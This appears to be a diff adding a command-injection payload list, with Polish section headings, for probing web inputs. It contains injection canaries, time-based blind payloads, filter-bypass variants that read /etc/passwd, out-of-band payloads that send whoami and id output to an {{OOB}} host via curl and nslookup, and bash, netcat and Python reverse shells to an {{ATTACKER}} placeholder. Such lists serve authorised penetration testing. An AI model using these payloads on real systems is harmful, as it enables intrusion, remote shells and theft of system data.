@@ -1,0 +1,66 @@
+# === Detection canaries (Unix) ===
+;id
+|id
+&&id
+||id
+`id`
+$(id)
+;`id`
+
+# === Detection canaries (Windows) ===
+&whoami
+|whoami
+&&whoami
+||whoami
+
+# === Newline injection (gdy spacje filtrowane) ===
+%0aid
+%0a/bin/id
+%0d%0aid
+
+# === Time-based blind (Unix) ===
+;sleep 5
+|sleep 5
+`sleep 5`
+$(sleep 5)
+;ping -c 5 127.0.0.1
+%0asleep%205
+
+# === Time-based blind (Windows) ===
+&ping -n 5 127.0.0.1
+&timeout /t 5
+
+# === Bypass — bez spacji ===
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+cat</etc/passwd
+
+# === Bypass — keyword filter (cat, id, sh) ===
+c''at /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+/bin/c?t /etc/passwd
+/???/??t /etc/passwd
+/bin/[c]at /etc/passwd
+
+# === Bypass — slash filter ===
+cat${IFS}\$(echo${IFS}-e${IFS}'\x2fetc\x2fpasswd')
+
+# === Out-of-band detection (DNS) ===
+# Wymagana podmiana {{OOB}}
+;curl http://{{OOB}}/`whoami`
+;nslookup `whoami`.{{OOB}}
+;ping -c 1 `whoami`.{{OOB}}
+$(curl http://{{OOB}}/$(id|base64))
+
+# === Reverse shell (Unix) — wymaga {{ATTACKER}} ===
+;bash -c 'bash -i >& /dev/tcp/{{ATTACKER}}/4444 0>&1'
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ATTACKER}} 4444 >/tmp/f
+;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ATTACKER}}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
+
+# === Wildcards / globbing ===
+/???/??t /???/p??s??
+
+# === Polyglot (działa w wielu kontekstach) ===
+;id|`id`&id&&id||id
